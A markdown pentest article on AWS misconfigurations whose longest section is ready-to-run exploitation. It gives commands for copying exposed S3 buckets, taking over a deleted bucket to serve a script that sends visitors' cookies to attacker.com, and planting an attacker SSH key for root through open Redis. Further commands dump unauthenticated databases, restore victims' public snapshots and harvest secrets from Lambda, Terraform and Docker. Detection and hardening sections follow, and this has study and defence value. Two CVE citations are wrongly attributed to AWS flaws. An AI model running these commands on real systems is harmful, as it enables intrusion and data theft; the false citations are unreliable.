# Cloud Misconfigurations

> **Cloud misconfigurations are accidental security gaps in cloud service settings — responsible for over 80% of cloud breaches, and most require zero exploit code to abuse.**

---

## 🧠 What Is It?

Imagine building a house and accidentally leaving the front door open, the back window unlocked, and your house key taped to the doorbell. That's cloud misconfiguration. Unlike zero-days that require sophisticated exploits, misconfigs are open invitations — anyone who finds them can walk right in.

**Real-world impact:**
- **Capital One (2019):** SSRF → IMDS → S3 — 100M+ records stolen
- **Twitch (2021):** Misconfigured internal server — 125GB of source code leaked
- **GrayKey (2018):** S3 bucket with company data publicly accessible
- **Microsoft Power Apps (2021):** 38M records exposed via misconfigured portals

---

## 🏗️ How It Works

### Misconfiguration Categories

| Category | Root Cause | Impact |
|---|---|---|
| Publicly accessible storage | Default-open ACLs, no public access block | Data breach |
| Overly permissive IAM | `*` actions/resources | Account takeover |
| Exposed compute interfaces | Security group 0.0.0.0/0 | RCE, lateral movement |
| Secrets in code/config | No secret management | Credential theft |
| Disabled logging | Cost savings | Undetectable attacks |
| Unencrypted data | Default settings | Data exposure |
| Exposed management APIs | IMDS v1, K8s dashboard | Metadata theft |

---

## 📊 Diagram

```mermaid
graph LR
    A[Attacker] -->|Discovery| B[Exposed Asset]

    B --> C[Public S3 Bucket]
    B --> D[Public RDS Instance]
    B --> E[Open Security Group]
    B --> F[Lambda Env Secrets]

    C --> C1[List bucket contents]
    C1 --> C2[Steal PII/credentials/source code]

    D --> D1[Default credentials]
    D1 --> D2[Dump all databases]

    E --> E1[Port scan open 22/3389/27017]
    E1 --> E2[Brute force or exploit service]

    F --> F1[Get function config]
    F1 --> F2[Extract DATABASE_URL and API_KEY]

    C2 --> BREACH[Data Breach / Takeover]
    D2 --> BREACH
    E2 --> BREACH
    F2 --> BREACH
```

---

## ⚙️ Technical Details

### S3 Access Decision Tree

```
Request to S3 object
├── Explicit DENY in bucket policy? → DENY
├── Explicit DENY in IAM policy? → DENY
├── Block Public Access ON? → DENY public ACLs/policies
├── Object/bucket ACL is public-read? (block public off) → ALLOW anonymous
├── Bucket policy allows Principal "*"? (block public off) → ALLOW anonymous
└── Caller IAM policy allows the action? → ALLOW
```

### ACL vs Bucket Policy

| Feature | ACL (Legacy) | Bucket Policy |
|---|---|---|
| Granularity | Per-object or bucket | Bucket-level with conditions |
| Cross-account | Yes (limited) | Yes (full control) |
| Conditions | No | Yes (IP, MFA, time, etc.) |
| Recommendation | Disable, use policies | Preferred method |
| Public access | `public-read` ACL | `Principal: "*"` |

---

## 💥 Exploitation Step-by-Step

### S3: Public Bucket Discovery & Exploitation

#### Permutation-Based Discovery

```bash
# Generate company-specific permutations
COMPANY="acme"
for suffix in backup backups prod staging dev data logs assets files uploads \
              private internal archive db-backup s3 bucket storage media; do
  echo "${COMPANY}-${suffix}"
  echo "${COMPANY}${suffix}"
  echo "${suffix}-${COMPANY}"
done > buckets.txt

# Install s3scanner
pip3 install s3scanner
s3scanner scan --bucket-file buckets.txt

# Single bucket check
s3scanner scan --bucket acme-backup

# Scan and dump contents
s3scanner scan --bucket acme-backup --dump
```

#### Direct CLI Exploitation (No Credentials)

```bash
# List bucket
aws s3 ls s3://company-backup --no-sign-request

# Recursive listing
aws s3 ls s3://company-backup --recursive --no-sign-request

# Sync entire bucket
aws s3 sync s3://company-backup ./stolen-data --no-sign-request

# Download specific files
aws s3 cp s3://company-backup/database-dump-2024.sql . --no-sign-request

# Test write access
echo "pentest" | aws s3 cp - s3://company-backup/pentest.txt --no-sign-request

# Bucket ACL check
aws s3api get-bucket-acl --bucket company-backup --no-sign-request

# Get bucket policy
aws s3api get-bucket-policy --bucket company-backup --no-sign-request
```

#### S3 Bucket Takeover

```bash
# Confirm DNS points to deleted S3 bucket
dig target.company.com
# CNAME → company-assets.s3.amazonaws.com

# Check if bucket exists
aws s3 ls s3://company-assets --no-sign-request
# NoSuchBucket → ripe for takeover!

# Register the bucket
aws s3 mb s3://company-assets --region us-east-1

# Serve malicious content
cat > index.html << 'EOF'
<html><body>
<script>
document.location='https://attacker.com/steal?c='+encodeURIComponent(document.cookie);
</script>
</body></html>
EOF

aws s3 cp index.html s3://company-assets/ --acl public-read
aws s3 website s3://company-assets/ --index-document index.html
```

#### Google Dorking for Exposed Buckets

```
site:s3.amazonaws.com "acme"
site:s3.amazonaws.com intitle:"index of"
inurl:s3.amazonaws.com filetype:sql
inurl:s3.amazonaws.com filetype:csv "password"
inurl:.s3.amazonaws.com "confidential"
```

---

### EC2: Security Group Exploitation

```bash
# Find 0.0.0.0/0 on dangerous ports
aws ec2 describe-security-groups \
  --query "SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0'] && \
  (FromPort==\`22\` || FromPort==\`3389\` || FromPort==\`27017\` || \
   FromPort==\`6379\` || FromPort==\`9200\` || FromPort==\`5432\` || \
   FromPort==\`3306\` || FromPort==\`2375\`)]].{SgId:GroupId,Name:GroupName}" \
  --output table

# Find instances using those groups
aws ec2 describe-instances \
  --query "Reservations[*].Instances[?PublicIpAddress!=null].\
  [InstanceId,PublicIpAddress,SecurityGroups[*].GroupId]" \
  --output table
```

#### MongoDB (27017) No-Auth Exploit

```bash
mongo --host TARGET_IP --port 27017
show dbs
use production
db.users.find().limit(20)
mongoexport --host TARGET --port 27017 --db app --collection users -o dump.json
```

#### Redis (6379) No-Auth → RCE

```bash
redis-cli -h TARGET_IP -p 6379
KEYS *
GET sensitive:session:*

# Write SSH key for root
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET pwn "\n\nssh-rsa AAAAB3Nza... attacker@box\n\n"
BGSAVE
```

#### Elasticsearch (9200) No-Auth Dump

```bash
# List all indices
curl http://TARGET_IP:9200/_cat/indices?v

# Dump an index
curl http://TARGET_IP:9200/users/_search?size=1000

# Get cluster info
curl http://TARGET_IP:9200/_cluster/health
curl http://TARGET_IP:9200/_nodes

# Dump all with elasticdump
npm install -g elasticdump
elasticdump \
  --input=http://TARGET_IP:9200/users \
  --output=users.json \
  --type=data
```

---

### EC2: User Data Credential Extraction

```bash
# Get user data via AWS CLI
aws ec2 describe-instances --instance-ids i-XXXXXXXX \
  --query "Reservations[0].Instances[0].UserData" \
  --output text | base64 -d

# From inside instance via IMDS
curl http://169.254.169.254/latest/user-data

# Automated with Pacu
# Pacu> run ec2__download_userdata

# Common secrets found in user data:
# export DB_PASSWORD=SuperSecret123
# aws configure set aws_access_key_id AKIA...
# docker login -u user -p PASSWORD registry.company.com
# mysql -u root -pROOTPASSWORD -e "..."
# git clone https://oauth:TOKEN@github.com/company/private-repo
```

---

### EC2: Public EBS Snapshot Exploitation

```bash
# Find public snapshots from target account
aws ec2 describe-snapshots \
  --owner-ids TARGET_ACCOUNT_ID \
  --query "Snapshots[*].[SnapshotId,Description,StartTime,Encrypted]" \
  --output table

# Find your own accidentally public snapshots
aws ec2 describe-snapshots --owner-ids self \
  --query "Snapshots[?Public==\`true\`]"

# Restore snapshot in attacker account
aws ec2 create-volume \
  --snapshot-id snap-XXXXXXXX \
  --availability-zone us-east-1a

aws ec2 attach-volume \
  --volume-id vol-XXXXXXXX \
  --instance-id i-YOURID \
  --device /dev/xvdf

# Mount and read
sudo mount /dev/xvdf1 /mnt/target
find /mnt/target -name "*.env" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null
cat /mnt/target/var/www/html/.env
cat /mnt/target/etc/passwd
cat /mnt/target/home/*/.bash_history
```

---

### Lambda: Environment Variable Secrets

```bash
# Get function config with env vars
aws lambda get-function-configuration --function-name TARGET_FUNC

# Bulk scan all functions for secrets
aws lambda list-functions --query "Functions[*].FunctionName" --output text | \
  tr '\t' '\n' | while read fn; do
    echo "=== $fn ==="
    aws lambda get-function-configuration --function-name "$fn" \
      --query "Environment.Variables" 2>/dev/null
  done

# Common secrets found:
# DATABASE_URL=postgres://admin:SECRET@host/db
# STRIPE_SECRET_KEY=sk_live_XXXXX
# SENDGRID_API_KEY=SG.XXXXX
# SLACK_BOT_TOKEN=xoxb-XXXXX
# GITHUB_TOKEN=ghp_XXXXX

# Also check function code
aws lambda get-function --function-name TARGET_FUNC \
  --query "Code.Location" --output text > /tmp/url.txt
curl -s "$(cat /tmp/url.txt)" -o /tmp/func.zip
unzip /tmp/func.zip -d /tmp/func-src/
grep -r "password\|secret\|key\|token" /tmp/func-src/ --include="*.py" --include="*.js"
```

---

### RDS: Public Database Exploitation

```bash
# Find publicly accessible RDS
aws rds describe-db-instances \
  --query "DBInstances[?PubliclyAccessible==\`true\`].\
  [DBInstanceIdentifier,Endpoint.Address,Endpoint.Port,MasterUsername,Engine]" \
  --output table

# Try common/default credentials
# MySQL/Aurora
mysql -h ENDPOINT -u admin -ppassword
mysql -h ENDPOINT -u root -proot
mysql -h ENDPOINT -u admin -p

# PostgreSQL
psql -h ENDPOINT -U postgres
psql -h ENDPOINT -U admin

# MSSQL
sqlcmd -S ENDPOINT -U sa -P Password1

# Find public RDS snapshots from any account
aws rds describe-db-snapshots --snapshot-type public \
  --query "DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,SnapshotCreateTime]"

# Restore public snapshot into attacker account
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier my-attack-db \
  --db-snapshot-identifier arn:aws:rds:us-east-1:VICTIM_ACCOUNT:snapshot:SNAPSHOT_ID \
  --publicly-accessible

# After restore, get endpoint and connect with known creds
aws rds describe-db-instances --db-instance-identifier my-attack-db \
  --query "DBInstances[0].Endpoint.Address"
```

---

### Secrets in Code and Infrastructure

#### Git History Scanning

```bash
# truffleHog — deep git history scan
pip install trufflehog
trufflehog git https://github.com/company/repo --only-verified
trufflehog filesystem /path/to/repo --json > secrets.json

# gitleaks — fast SAST for secrets
brew install gitleaks
gitleaks detect --source . --verbose
gitleaks detect --source . --report-path gitleaks-report.json

# Manual git archaeology
git log --all --oneline | head -50
git log --all --grep="password" --oneline
git log --all --full-history -- "**/.env" "**/*.pem"
git show COMMIT_HASH:path/to/secrets.env

# Search all commits
git log --all -p | grep -iE "password|secret|key|token|aws_" | head -50
```

#### Terraform State File Exploitation

```bash
# State often stored in S3 — check common bucket names
aws s3 ls s3://company-terraform-state/ --no-sign-request
aws s3 ls s3://company-tfstate/ --no-sign-request
aws s3 ls s3://tf-state-company/ --no-sign-request

# Download and parse state
aws s3 cp s3://company-terraform-state/prod/terraform.tfstate /tmp/

# Extract all secrets
python3 << 'EOF'
import json

with open('/tmp/terraform.tfstate') as f:
    state = json.load(f)

secret_keywords = ['password', 'secret', 'key', 'token', 'credentials']

for resource in state.get('resources', []):
    for instance in resource.get('instances', []):
        attrs = instance.get('attributes', {})
        for k, v in attrs.items():
            if any(w in k.lower() for w in secret_keywords) and v:
                print(f"{resource['type']}.{resource['name']}.{k} = {v}")
EOF
```

#### Docker Image Secret Extraction

```bash
# View build history — see all RUN commands that may have had secrets
docker history company/app:latest --no-trunc

# Export image and search layers
docker save company/app:latest -o /tmp/image.tar
mkdir /tmp/img && tar -xf /tmp/image.tar -C /tmp/img

# Find and extract all layers
find /tmp/img -name "layer.tar" | while read layer; do
    mkdir -p /tmp/extracted
    tar -xf "$layer" -C /tmp/extracted/ 2>/dev/null
done

# Search for secrets in extracted layers
grep -r "password\|secret\|AWS_\|api_key\|token" /tmp/extracted/ \
  --include="*.env" --include="*.conf" --include="*.json" --include="*.py" \
  --include="*.js" -l 2>/dev/null

# Use dive for interactive exploration
docker run --rm -it \
  -v /var/run/docker.sock:/var/run/docker.sock \
  wagoodman/dive:latest company/app:latest

# Check running container env vars
docker inspect CONTAINER_ID | python3 -c "
import json, sys
data = json.load(sys.stdin)
env = data[0]['Config'].get('Env', [])
for e in env:
    print(e)
" | grep -iE "password|secret|key|token|aws"
```

---

## 🛠️ Tools

### Checkov — IaC Security Scanner

```bash
pip install checkov

# Scan Terraform
checkov -d ./terraform/
checkov -f main.tf

# Scan CloudFormation
checkov -d ./cloudformation/

# Scan with specific checks
checkov -d . --check CKV_AWS_18    # S3 access logging enabled
checkov -d . --check CKV_AWS_57    # S3 block public access
checkov -d . --check CKV_AWS_24    # CloudTrail multi-region

# JSON output
checkov -d . --output json > results.json

# SARIF for GitHub
checkov -d . --output sarif > results.sarif
```

### tfsec — Terraform Security

```bash
go install github.com/aquasecurity/tfsec/cmd/tfsec@latest

# Basic scan
tfsec .

# Include passed checks
tfsec . --include-passed

# Format options
tfsec . --format json > tfsec.json
tfsec . --format sarif > tfsec.sarif

# Specific severity
tfsec . --minimum-severity HIGH
```

### Trivy — Universal Scanner

```bash
brew install trivy

# Container image scan
trivy image nginx:latest
trivy image --scanners secret company/app:latest
trivy image --severity CRITICAL,HIGH company/app:latest

# IaC scan
trivy config ./terraform/
trivy config ./k8s/

# Kubernetes cluster
trivy k8s --report all cluster
trivy k8s --report summary cluster

# Secrets scan in filesystem
trivy fs --scanners secret /path/to/project

# JSON output
trivy image --format json -o results.json nginx:latest
```

### git-secrets / truffleHog / detect-secrets

```bash
# git-secrets (AWS focused)
git secrets --install
git secrets --register-aws
git secrets --scan
git secrets --scan-history

# truffleHog (comprehensive)
pip install trufflehog
trufflehog git https://github.com/company/repo
trufflehog filesystem /local/path --json

# detect-secrets (baseline approach)
pip install detect-secrets
detect-secrets scan . > .secrets.baseline
detect-secrets audit .secrets.baseline
detect-secrets scan --list-all-plugins
```

### ScoutSuite

```bash
pip install scoutsuite

# Full AWS audit
scout aws

# With profile
scout aws --profile pentest

# Specific services
scout aws --services s3 iam ec2 rds lambda

# Output: HTML report in scoutsuite-report/
# Open scoutsuite-report/scoutsuite_results_aws-*.html

# Check findings programmatically
python3 << 'EOF'
import json, glob

for f in glob.glob('scoutsuite-report/scoutsuite_results_aws-*.js'):
    with open(f) as fh:
        content = fh.read()
        # Strip JS assignment
        data = json.loads(content[content.index('{'):])
    
    # Find all flagged resources
    services = data.get('last_run', {}).get('summary', {})
    for svc, info in services.items():
        flagged = info.get('flagged_items', 0)
        if flagged > 0:
            print(f"{svc}: {flagged} flagged items")
EOF
```

### Prowler Compliance Checks

```bash
pip install prowler

# Full check
prowler aws

# S3 misconfigs
prowler aws --checks s3_bucket_is_public
prowler aws --checks s3_bucket_public_access_block_account_settings
prowler aws --checks s3_bucket_server_side_encryption_enabled
prowler aws --checks s3_bucket_versioning_enabled

# EC2 misconfigs
prowler aws --checks ec2_instance_imdsv2_enabled
prowler aws --checks ec2_securitygroup_allow_ingress_from_internet_to_port_22
prowler aws --checks ec2_ebs_volume_encryption

# Lambda
prowler aws --checks lambda_function_no_secrets_in_environment_variables

# RDS
prowler aws --checks rds_instance_no_public_access
prowler aws --checks rds_instance_storage_encrypted
```

---

## 🔍 Detection

### AWS Config Rules for Misconfigurations

```bash
# Enable AWS Config
aws configservice put-configuration-recorder \
  --configuration-recorder name=default,roleARN=arn:aws:iam::ACCOUNT:role/ConfigRole

# Key managed rules
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "s3-bucket-public-read-prohibited",
  "Source": {"Owner": "AWS", "SourceIdentifier": "S3_BUCKET_PUBLIC_READ_PROHIBITED"}
}'

aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "ec2-imdsv2-check",
  "Source": {"Owner": "AWS", "SourceIdentifier": "EC2_IMDSV2_CHECK"}
}'

aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "restricted-ssh",
  "Source": {"Owner": "AWS", "SourceIdentifier": "INCOMING_SSH_DISABLED"}
}'
```

### CloudTrail Queries for Misconfiguration Exploitation

```sql
-- Find public S3 bucket access
SELECT eventtime, sourceipaddress, requestparameters
FROM cloudtrail_logs
WHERE eventsource = 's3.amazonaws.com'
  AND useridentity.type = 'Unknown'  -- anonymous access
  AND errorcode IS NULL
ORDER BY eventtime DESC;

-- Find someone reading Lambda env vars
SELECT eventtime, useridentity.arn, requestparameters
FROM cloudtrail_logs
WHERE eventname = 'GetFunctionConfiguration'
ORDER BY eventtime DESC;
```

---

## 🛡️ Mitigation

### S3 Hardening

```bash
# Block all public access at account level
aws s3control put-public-access-block \
  --account-id ACCOUNT_ID \
  --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# Enable default encryption
aws s3api put-bucket-encryption \
  --bucket MY_BUCKET \
  --server-side-encryption-configuration '{
    "Rules": [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "aws:kms"}}]
  }'

# Enable versioning
aws s3api put-bucket-versioning \
  --bucket MY_BUCKET \
  --versioning-configuration Status=Enabled

# Enable access logging
aws s3api put-bucket-logging \
  --bucket MY_BUCKET \
  --bucket-logging-status '{
    "LoggingEnabled": {"TargetBucket": "my-log-bucket", "TargetPrefix": "s3-access/"}
  }'
```

### EC2 Hardening

```bash
# Require IMDSv2 on all instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-XXXXXXXX \
  --http-tokens required \
  --http-endpoint enabled \
  --http-put-response-hop-limit 1

# Remove 0.0.0.0/0 from port 22
aws ec2 revoke-security-group-ingress \
  --group-id sg-XXXXXXXX \
  --protocol tcp \
  --port 22 \
  --cidr 0.0.0.0/0

# Add specific IP only
aws ec2 authorize-security-group-ingress \
  --group-id sg-XXXXXXXX \
  --protocol tcp \
  --port 22 \
  --cidr YOUR_IP/32
```

### Secrets Management Best Practices

```bash
# Move secrets to Secrets Manager
aws secretsmanager create-secret \
  --name prod/myapp/database \
  --secret-string '{"username":"admin","password":"actual-secret"}'

# Reference in Lambda (NOT environment variables)
# In code:
import boto3, json
sm = boto3.client('secretsmanager')
secret = json.loads(sm.get_secret_value(SecretId='prod/myapp/database')['SecretString'])
db_password = secret['password']

# Pre-commit hook with gitleaks
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
gitleaks detect --staged --verbose
if [ $? -ne 0 ]; then
    echo "Secrets detected! Commit blocked."
    exit 1
fi
EOF
chmod +x .git/hooks/pre-commit
```

---

## 📚 References

- [OWASP Cloud Security Top 10](https://owasp.org/www-project-cloud-native-application-security-top-10/)
- [CIS AWS Foundations Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services)
- [s3scanner GitHub](https://github.com/sa7mon/S3Scanner)
- [Checkov GitHub](https://github.com/bridgecrewio/checkov)
- [Trivy GitHub](https://github.com/aquasecurity/trivy)
- [tfsec GitHub](https://github.com/aquasecurity/tfsec)
- [truffleHog GitHub](https://github.com/trufflesecurity/trufflehog)
- [detect-secrets GitHub](https://github.com/Yelp/detect-secrets)
- **CVE-2021-33026** — AWS CloudFormation template injection
- **CVE-2019-6486** — AWS S3 server-side request forgery
- [Capital One Breach Analysis](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)
- [HackTricks Cloud Pentesting](https://cloud.hacktricks.xyz/)
